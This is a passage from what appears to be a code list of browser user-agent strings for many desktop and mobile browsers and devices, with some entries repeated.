    'Mozilla/5.0 (Linux; Android 6.0; CHM-U01) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Avast/111.0.20716.147',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.3.1.806 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2.978 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0 (Edition Yx 05)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DCO-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N986N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2104K10I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2413) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 13; SM-A042F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2101K6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Avast/111.0.20716.147',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.3.1.806 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2.978 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0 (Edition Yx 05)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36','Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466737224 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3494567444137370641 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v8456192580969411449 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v4033463474784022088 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3487728955102158976 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562041164 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v2028522216649479612 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466765596 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v7057368071126839728 t3234796395378176538 ath259cea6f altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4531716181114487945 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7839198237783962048 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2868933807952903034 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4562065068 t18327271585961317 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2194678058344203461 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v2718743228222662861 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v7590918487987830442 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 RuxitSynthetic/1.0 v14466784599 t4787681247261519342 athfa3c3975 altpub cvcv=2 smf=0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1609911553678633550 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36/JrKhPNkF-40',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 TeslaBrowser/109.0.5414.75',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Whale/3.19.166.16 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/90.0.4480.84',
'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/348.0.0.39.118;]',
'Mozilla/5.0 (Linux; Android 10; LM-K500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Mobile Safari/537.36',
'Opera/9.80 (Android; Opera Mini/7.6.40099/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 11; Scepter 8 Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6.0.1; LG-K425) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (X11; Linux armv7l; rv:95.0) Gecko/20100101 Firefox/95.0',
'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4657.124 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4653.100 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; en-US) Gecko/20100101 Firefox/89.0',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4691.107 Safari/537.36',
'Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4655.154 Safari/537.36',
'Mozilla/5.0 (Linux; arm_64; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 YaBrowser/21.11.1.114.00 SA/3 Mobile Safari/537.36',
'SAMSUNG-SM-B313E Opera/9.80 (J2ME/MIDP; Opera Mini/4.5.40318/191.256; U; en) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'ELinks/0.11.1-1.2ubuntu2.2-debian (textmode; Linux 2.6.20-16-generic i686; 80x24-2)',
'Mozilla/5.0 (Linux; Android 12; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8.1.0; W-K130-TMV Build/OPM2.171019.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.4.2; MITO T10 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto g(7) plus Build/QPWS30.61-21-18-7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SM-G800H Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; 6.0; Nomi i5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG moto g stylus 5G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; U; Android 3.2; en-us; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13',
'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510MN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36 OPR/65.2.3381.61420',
'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930R4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Mobile/15E148 Safari/604.1',
'Opera/9.80 (Android; Opera Mini/20.0.2254/191.256; U; tr) Presto/2.12.423 Version/12.16',
'Mozilla/5.0 (Linux; Android 10; SM-G981V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; moto e5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36 EdgA/96.0.1054.62',
'Mozilla/5.0 (Linux; Android 10; GM1917) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4692.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A415F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/343.0.0.37.117;]',
'Mozilla/5.0 (Linux; Android 10; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; BQ-6040L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7.1.1; ONEPLUS A3010 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7; rv:94.0) Gecko/20100101 Firefox/94.0',
